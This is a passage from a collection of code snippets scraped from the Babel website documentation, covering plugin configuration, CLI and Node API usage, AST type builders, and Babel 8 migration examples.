https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-constructors.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-regexp-constructors\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using JSON Strings Syntax Plugin via CLI\nDESCRIPTION: Uses the Babel CLI to transform a file using the @babel/plugin-syntax-json-strings plugin.  The `script.js` file is transformed, enabling the parsing of JSON string syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-json-strings.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-json-strings script.js\n```\n\n----------------------------------------\n\nTITLE: Transforming with Node API\nDESCRIPTION: Uses the Babel Node API to transform code with the @babel/plugin-syntax-dynamic-import plugin. This allows processing of dynamic import() syntax when Babel transforms code programmatically.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-dynamic-import\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a DecimalLiteral AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.decimalLiteral` to create a decimal literal node in the AST. It takes a string representing the decimal value. The resulting node represents a numeric literal with the given decimal value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_32\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.decimalLiteral(value);\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via Node API\nDESCRIPTION: Uses the Babel Node API to transform code with the safari-id-destructuring-collision-in-function-expression plugin. This allows programmatic use of the plugin within a Node.js environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-id-destructuring-collision-in-function-expression.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Decimal in Babel 7\nDESCRIPTION: Illustrates the use of decimal literals in Babel 7. This feature adds support for decimal numbers in JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_22\n\nLANGUAGE: javascript\nCODE:\n```\n0.3m\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin with babel.config.json\nDESCRIPTION: This JSON configuration snippet shows how to enable the plugin by adding it to the 'plugins' array in a babel.config.json file.  This is the recommended approach for configuring Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-unicode-sets-regex.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-unicode-sets-regex\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an ArrayExpression Node\nDESCRIPTION: Creates an AST node representing an array expression. Requires the `elements` parameter, which is an array of `null | Expression | SpreadElement`. Use `t.isArrayExpression(node, opts)` to check if a node is an ArrayExpression and `t.assertArrayExpression(node, opts)` to assert that a node is an ArrayExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.arrayExpression(elements);\n```\n\n----------------------------------------\n\nTITLE: Transformed WASM Import (Node.js CommonJS)\nDESCRIPTION: This JavaScript code shows the transformed output for Node.js using CommonJS modules, reading the WASM file using `fs.readFileSync` and creating a `WebAssembly.Module` instance.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n\"use strict\";\n\nconst libMod = new WebAssembly.Module(require(\"fs\").readFileSync(require.resolve(\"./lib.wasm\")));\n```\n\n----------------------------------------\n\nTITLE: Babel Config: Plugin Usage - No Options\nDESCRIPTION: This JSON configuration snippet demonstrates how to enable the `@babel/plugin-transform-private-methods` plugin in a `babel.config.json` file without any specific options. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-private-methods\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming `using` declarations (Input)\nDESCRIPTION: This code snippet shows the JavaScript code that uses the `using` keyword, which will be transformed by the Babel plugin. It demonstrates both synchronous and asynchronous resource acquisition.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-explicit-resource-management.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nusing handlerSync = openSync();\nawait using handlerAsync = await openAsync();\n```\n\n----------------------------------------\n\nTITLE: Transform Undefined to Void: JavaScript Example\nDESCRIPTION: This JavaScript code snippet demonstrates how the plugin transforms `foo === undefined` into `foo === void 0`. It ensures a consistent undefined value.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-undefined-to-void.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfoo === undefined;\n```\n\n----------------------------------------\n\nTITLE: Creating a TS Call Signature Declaration Node in Babel\nDESCRIPTION: Creates a `TSCallSignatureDeclaration` AST node using the Babel types module. This node represents a call signature declaration in TypeScript, accepting type parameters, parameters, and a type annotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_163\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsCallSignatureDeclaration(typeParameters, parameters, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: JavaScript Transformation Example\nDESCRIPTION: This example demonstrates how the babel-plugin-minify-builtins plugin transforms JavaScript code. It shows the input code containing calls to Math.floor and the output code where Math.floor is replaced with a variable reference for minification.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-builtins.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nMath.floor(a) + Math.floor(b)\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _Mathfloor = Math.floor;\n\n_Mathfloor(a) + _Mathfloor(b);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configuration snippet demonstrating how to enable the `@babel/plugin-transform-react-inline-elements` plugin within a `babel.config.json` file. This is the recommended way to configure Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-inline-elements.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-inline-elements\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin in babel.config.json\nDESCRIPTION: Configures the @babel/plugin-syntax-object-rest-spread plugin in the babel.config.json file. This enables Babel to parse object rest and spread syntax when processing JavaScript files in the project. It requires a babel configuration file and adds the plugin to the plugins array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-object-rest-spread.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-object-rest-spread\"]\n}\n```\n\n----------------------------------------\n\nTITLE: NumericLiteral Validation in JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how Babel 8 rejects negative and NaN/infinite numbers from `t.numericLiteral`, requiring alternative representations.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_68\n\nLANGUAGE: javascript\nCODE:\n```\n// NumericLiterals must be non-negative finite numbers.\nt.numericLiteral(-1);\n```\n\n----------------------------------------\n\nTITLE: Creating a NumberLiteralTypeAnnotation in JavaScript\nDESCRIPTION: This code snippet shows how to create a `NumberLiteralTypeAnnotation` AST node using `t.numberLiteralTypeAnnotation(value)`. The `value` parameter is a required number representing the literal value of the type annotation.  The created node can be used within Flow type definitions.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_119\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.numberLiteralTypeAnnotation(value);\n```\n\n----------------------------------------\n\nTITLE: Spread Syntax Transformation - Output\nDESCRIPTION: This example shows the output code after the @babel/plugin-transform-spread plugin has transformed the spread syntax. It replaces the spread operator with equivalent `concat` and `apply` methods for broader compatibility.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nvar a = [\"a\", \"b\", \"c\"];\n\nvar b = a.concat([\"foo\"]);\n\nvar c = foo.apply(void 0, a);\n```\n\n----------------------------------------\n\nTITLE: AST Representation of Dynamic Import in Babel 7 (TypeScript)\nDESCRIPTION: This code snippet illustrates how a dynamic import statement is represented in the Abstract Syntax Tree (AST) in Babel 7. It uses a CallExpression with the callee being an Import node and the arguments being the import source and options. This representation is considered deprecated in Babel 8.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n{\n  type: \"CallExpression\",\n  callee: { type: \"Import\" },\n  arguments: [\n    StringLiteral(\"foo\"),\n    Identifier(\"options\")\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via Node API\nDESCRIPTION: This JavaScript snippet shows how to use the plugin programmatically via the Babel Node API. It calls `transformSync` to transform code with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-environment-variables.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-inline-environment-variables\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Arrow Function this Context Example JavaScript\nDESCRIPTION: Illustrates how `this` is scoped in arrow functions differently from regular functions in JavaScript objects. It highlights the issue of `this` not referencing the object in arrow functions and shows the correct method shorthand to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/faq.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst user = {\n  firstName: \"Sebastian\",\n  lastName: \"McKenzie\",\n  getFullName: () => {\n    // whoops! `this` doesn't actually reference `user` here\n    return this.firstName + \" \" + this.lastName;\n  },\n  // use the method shorthand in objects\n  getFullName2() {\n    return this.firstName + \" \" + this.lastName;\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Creating Intersection Type Annotation in JavaScript\nDESCRIPTION: This snippet demonstrates creating an `IntersectionTypeAnnotation` AST node using Babel's `t.intersectionTypeAnnotation` builder. The `types` parameter is an array of `FlowType` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_92\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.intersectionTypeAnnotation(types);\n```\n\n----------------------------------------\n\nTITLE: Babel Config: Pipeline Operator with @@ Topic Token\nDESCRIPTION: This JSON configuration snippet configures the @babel/plugin-proposal-pipeline-operator with the 'hack' proposal and sets the topic token to '@@'. This configuration is used in babel.config.json to enable the pipeline operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-pipeline-operator.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-pipeline-operator\", { \"topicToken\": \"@@\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-object-set-prototype-of-to-assign plugin through the Babel Node API. It transforms the string 'code' using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-set-prototype-of-to-assign.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-object-set-prototype-of-to-assign\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin (Shell)\nDESCRIPTION: This command installs the `@babel/plugin-transform-react-jsx-compat` plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-compat.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-react-jsx-compat\n```\n\n----------------------------------------\n\nTITLE: Transform dynamic import to AMD\nDESCRIPTION: This code shows the transformation of a dynamic import to an AMD module format. The `import()` call is replaced with a `define()` call that uses `require` to load the module asynchronously.  It requires the `@babel/plugin-transform-modules-amd` plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\ndefine([\"require\"], function (_require) {\n  new Promise((_resolve, _reject) =>\n    _require(\n      [\"jquery\"],\n      (imported) => _resolve(_interopRequireWildcard(imported)),\n      _reject\n    )\n  ).then(($) => {});\n});\n```\n\n----------------------------------------\n\nTITLE: Generate code from AST with JSX plugin using @babel/generator\nDESCRIPTION: This JavaScript example demonstrates how to use @babel/generator with the JSX parser plugin. It parses JavaScript code containing a JSX element using @babel/parser with the `jsx` plugin enabled, then uses @babel/generator to generate code from the resulting AST. The output will still contain the JSX element.\nSOURCE: https://github.com/babel/website/blob/main/docs/generator.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { parse } from \"@babel/parser\";\nimport { generate } from \"@babel/generator\";\n\nconst code = \"const Example = () => <div>example</div>\";\nconst ast = parse(code, { plugins: [\"jsx\" ] });\n\nconst output = generate(\n  ast,\n);\n\n// true\noutput.includes(\"<div>\");\n```\n\n----------------------------------------\n\nTITLE: Run Babel via CLI Shell\nDESCRIPTION: Command-line usage of Babel to transform a single JavaScript file using the specified plugin.  The command takes an input `script.js` file and outputs the transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-logical-assignment-operators script.js\n```\n\n----------------------------------------\n\nTITLE: JSON Module Transform (uncheckedRequire: true)\nDESCRIPTION: This snippet demonstrates the transformed code when targeting CommonJS, with the `uncheckedRequire` option set to `true`. It uses `require` to import the JSON file directly, skipping additional checks.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_10\n\nLANGUAGE: js\nCODE:\n```\nconst data = require(\"./data.json\");\n```\n\n----------------------------------------\n\nTITLE: Use Block Scoping Plugin via Node API\nDESCRIPTION: Uses the @babel/plugin-transform-block-scoping plugin via the Node API to transform code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-block-scoping\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Using the Plugin via Node API\nDESCRIPTION: This code snippet shows how to use the Babel Node API to transform code with the `@babel/plugin-transform-react-jsx-self` plugin. It uses `require('@babel/core').transformSync` to transform the provided code string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-self.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-jsx-self\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Proxy Handler Traps JavaScript\nDESCRIPTION: This code snippet shows the various traps available in a Proxy handler object.  These traps intercept different operations on the target object.  Proxies are not transpiled or polyfilled due to ES5 limitations.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_26\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar handler =\n{\n  // target.prop\n  get: ...,\n  // target.prop = value\n  set: ...,\n  // 'prop' in target\n  has: ...,\n  // delete target.prop\n  deleteProperty: ...,\n  // target(...args)\n  apply: ...,\n  // new target(...args)\n  construct: ...,\n  // Object.getOwnPropertyDescriptor(target, 'prop')\n  getOwnPropertyDescriptor: ...,\n  // Object.defineProperty(target, 'prop', descriptor)\n  defineProperty: ...,\n  // Object.getPrototypeOf(target), Reflect.getPrototypeOf(target),\n  // target.__proto__, object.isPrototypeOf(target), object instanceof target\n  getPrototypeOf: ...,\n  // Object.setPrototypeOf(target), Reflect.setPrototypeOf(target)\n  setPrototypeOf: ...,\n  // Object.keys(target)\n  ownKeys: ...,\n  // Object.preventExtensions(target)\n  preventExtensions: ...,\n  // Object.isExtensible(target)\n  isExtensible :...\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Block Scoping Plugin\nDESCRIPTION: Configures the @babel/plugin-transform-block-scoping plugin within a babel.config.json file, demonstrating usage without options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-block-scoping\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin External Helpers via CLI\nDESCRIPTION: This shell command uses the Babel CLI to transform `script.js` with the `@babel/plugin-external-helpers` plugin enabled. This method is suitable for quick tests or one-off transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-external-helpers.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-external-helpers script.js\n```\n\n----------------------------------------\n\nTITLE: Creating a BooleanLiteral Node\nDESCRIPTION: Creates an AST node representing a boolean literal. Requires the `value` parameter, which is a boolean. Use `t.isBooleanLiteral(node, opts)` to check if a node is a BooleanLiteral and `t.assertBooleanLiteral(node, opts)` to assert that a node is a BooleanLiteral.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.booleanLiteral(value);\n```\n\n----------------------------------------\n\nTITLE: Smart Pipeline Example\nDESCRIPTION: This JavaScript code showcases the Smart Pipelines proposal with the `#` placeholder. It demonstrates how partial application, async, and other operations can be integrated using the lexical topic token.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\npromise\n  |> await #\n  |> doubleSay(#, ', ')\n  |> # || throw new TypeError()\n  |> capitalize\n  |> # + '!'\n  |> new User.Message(#)\n  |> await stream.write(#)\n  |> console.log;\n```\n\n----------------------------------------\n\nTITLE: Regex with Duplicated Named Capture Groups (JavaScript)\nDESCRIPTION: This code demonstrates the use of duplicated named capturing groups in a regular expression. The regex matches dates in either dd/mm/yyyy or yyyy-mm-dd format, allowing the same group names ('day', 'month', 'year') to be used in both alternatives. It showcases the new functionality supported by Babel 7.25.0.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-07-26-7.25.0.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nlet re =\n  /(?<day>\\d\\d)\\/(?<month>\\d\\d)\\/(?<year>\\d\\d\\d\\d)|(?<year>\\d\\d\\d\\d)-(?<month>\\d\\d)-(?<day>\\d\\d)/;\n\n\"21/12/2023\".match(re).groups.day; // 21\n\"2023-12-21\".match(re).groups.day; // 21\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via CLI\nDESCRIPTION: This command line invocation uses the Babel CLI to transpile a script, enabling the @babel/plugin-syntax-optional-chaining plugin. This plugin parses the optional chaining syntax in the input file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-optional-chaining script.js\n```\n\n----------------------------------------\n\nTITLE: new.target Usage in Function - JavaScript\nDESCRIPTION: Demonstrates the basic usage of `new.target` within a function context. It logs the value of `new.target` when the function is called directly and when it's invoked as a constructor. The expected output is `undefined` when called directly and the function's name when called with `new`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction Foo() {\n  console.log(new.target);\n}\n\nFoo(); // => undefined\nnew Foo(); // => Foo\n```\n\n----------------------------------------\n\nTITLE: Extending a Class (JavaScript)\nDESCRIPTION: This JavaScript code shows a class extending another class. The `constantSuper` assumption tells Babel that the super class is never changed via `Object.setPrototypeOf`. This allows Babel to statically determine the super class during compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Child extends Base {\n  method() {\n    super.method(2);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel CLI with npm\nDESCRIPTION: Installs the core Babel library and the Babel CLI as development dependencies using npm. This ensures that Babel is available within the project's environment and avoids global dependencies.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/babel_cli/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/core @babel/cli\n```\n\n----------------------------------------\n\nTITLE: Update ESLint Configuration\nDESCRIPTION: This diff shows the changes required in the .eslintrc.js file to update the parser and plugins to use the new @babel/eslint-parser and @babel scope.  It replaces the old 'babel-eslint' parser with '@babel/eslint-parser' and updates the 'babel' plugin to '@babel'.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-07-13-the-state-of-babel-eslint.md#_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\nmodule.exports = {\n---  parser: \"babel-eslint\",\n+++  parser: \"@babel/eslint-parser\"\n    plugins: [\n---   \"babel\"\n+++   \"@babel\"\n    ]\n};\n```\n\n----------------------------------------\n\nTITLE: Creating a TemplateElement Node in JavaScript\nDESCRIPTION: This snippet illustrates how to create a `TemplateElement` AST node using Babel's `t.templateElement` method. It takes a value object (containing raw and optionally cooked strings) and a boolean indicating if it's the tail element.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_226\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.templateElement(value, tail);\n```\n\n----------------------------------------\n\nTITLE: Checking for FunctionParent Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a parent node of a function, defining a new variable environment. It uses the `t.isFunctionParent(node)` method from Babel's `types` API. It covers nodes such as `ArrowFunctionExpression`, `ClassMethod`, `FunctionDeclaration`, `FunctionExpression`, `ObjectMethod`, `StaticBlock`, and `TSModuleBlock`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_274\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFunctionParent(node);\n```\n\n----------------------------------------\n\nTITLE: Valid Nullish Coalescing Operator Usage in JavaScript\nDESCRIPTION: This code snippet shows the correct way to use nullish coalescing operator (`??`) with logical operators (`&&` and `||`) using parentheses to explicitly define the order of operations.  This avoids ambiguity and satisfies the updated specification requirements.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-09-05-7.6.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n(a ?? b) || c; /* or */ a ?? (b || c);\n(a && b) ?? c; /* or */ a && (b ?? c);\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation (Shell)\nDESCRIPTION: This command installs the Babel plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-duplicate-named-capturing-groups-regex.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-duplicate-named-capturing-groups-regex\n```\n\n----------------------------------------\n\nTITLE: Importing generate function from @babel/generator\nDESCRIPTION: This code shows different ways to import the `generate` function from the `@babel/generator` package.  It demonstrates commonjs and ES module syntax for importing the module.\nSOURCE: https://github.com/babel/website/blob/main/docs/generator.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst generate = require(\"@babel/generator\");\nconst { generate } = require(\"@babel/generator\");\nimport { generate } from \"@babel/generator\";\n```\n\n----------------------------------------\n\nTITLE: Webpack Config with Core-js 2\nDESCRIPTION: Configures a Webpack entry point to include core-js polyfills for Promise and array iterator (es6). This is necessary for environments that lack native Promise support when using dynamic imports with Webpack and @babel/preset-env and core-js version 2.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst config = {\n  entry: [\n    \"core-js/modules/es6.promise\",\n    \"core-js/modules/es6.array.iterator\",\n    path.resolve(__dirname, \"src/main.js\"),\n  ],\n  // ...\n};\n```\n\n----------------------------------------\n\nTITLE: Using TypeScript Namespaces in TypeScript\nDESCRIPTION: This snippet demonstrates how to define and use a TypeScript namespace with a class inside. It highlights the syntax for declaring a namespace and exporting members. This is an example that shows the experimental namespace support.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-07-03-7.5.0.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nnamespace Validation {\n  const lettersRegexp = /^[A-Za-z]+$/;\n  const numberRegexp = /^[0-9]+$/;\n\n  export class LettersOnlyValidator {\n    isAcceptable(s: string) {\n      return lettersRegexp.test(s);\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babili CLI\nDESCRIPTION: This snippet shows how to install the Babili CLI tool as a development dependency using npm. This allows Babili to be used as a standalone minifier.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install babili --save-dev\n```\n\n----------------------------------------\n\nTITLE: Checking for Pattern Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a BindingPattern (excluding Identifier). It uses the `t.isPattern(node)` method from Babel's `types` API. This covers nodes such as `ArrayPattern`, `AssignmentPattern`, and `ObjectPattern`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_286\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isPattern(node);\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI (Shell)\nDESCRIPTION: This command demonstrates how to use the `@babel/plugin-transform-property-mutators` plugin via the Babel CLI. It transforms `script.js` using the specified plugin and outputs the transformed code to standard output.  Ensure that Babel CLI is installed globally or locally in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-mutators.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-property-mutators script.js\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: Configures the @babel/plugin-syntax-function-bind plugin in a babel.config.json file.  This allows Babel to use the plugin when transforming JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-bind.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-function-bind\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Splitting TSExpressionWithTypeArguments in Babel 8 (TS) - Interfaces\nDESCRIPTION: This snippet illustrates the splitting of `TSExpressionWithTypeArguments` into `TSClassImplements` and `TSInterfaceHeritage` in Babel 8 specifically for Interfaces.  This change provides more specific node types for class implementations and interface inheritance, respectively. Additionally, the `typeParameters` property is renamed to `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_43\n\nLANGUAGE: typescript\nCODE:\n```\ninterface I extends X<T> {}\n\n// AST in Babel 7\n{\n  type: \"TSInterfaceDeclaration\",\n  id: Identifier(\"I\"),\n  extends: [\n    {\n      type: \"TSExpressionWithTypeArguments\",\n      expression: Identifier(\"X\"),\n      typeParameters: {\n        type: \"TSTypeParameterInstantiation\",\n        params: [TSTypeReference(Identifier(\"T\"))]\n      }\n    }\n  ],\n  body: TSInterfaceBody([]),\n}\n\n// AST in Babel 8\n{\n  type: \"TSInterfaceDeclaration\",\n  id: Identifier(\"I\"),\n  extends: [\n    {\n      type: \"TSInterfaceHeritage\",\n      expression: Identifier(\"X\"),\n      typeArguments: {\n        type: \"TSTypeParameterInstantiation\",\n        params: [TSTypeReference(Identifier(\"T\"))]\n      }\n    }\n  ],\n  body: TSInterfaceBody([]),\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Null Literal in JavaScript\nDESCRIPTION: This snippet creates a `NullLiteral` AST node using Babel's `t.nullLiteral` builder. It takes no parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_116\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.nullLiteral();\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via Node API\nDESCRIPTION: Uses the @babel/plugin-syntax-import-defer plugin via the Node API to transform code. This enables parsing of `import defer` syntax. The transformSync method is used to apply the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-defer.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-import-defer\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-jsx via CLI\nDESCRIPTION: This command demonstrates how to use the @babel/plugin-syntax-jsx plugin via the Babel CLI.  It specifies the plugin to use when transforming the script.js file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-jsx.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-jsx script.js\n```\n\n----------------------------------------\n\nTITLE: Annotate as Pure Output JavaScript\nDESCRIPTION: Demonstrates the output after applying `@babel/helper-annotate-as-pure`. It illustrates how the `#__PURE__` annotation is added as a leading comment.  It also highlights the caveat with UglifyJS versions prior to v3.1.0, which only check the last leading comment for the annotation.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-annotate-as-pure.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst four = /* #__PURE__ */ /* foo */ add(2, 2);\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectTypeIndexer in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `ObjectTypeIndexer` AST node using `t.objectTypeIndexer(id, key, value, variance)`. It represents an indexer property in a Flow object type annotation. Parameters include an ID, key type, value type, and 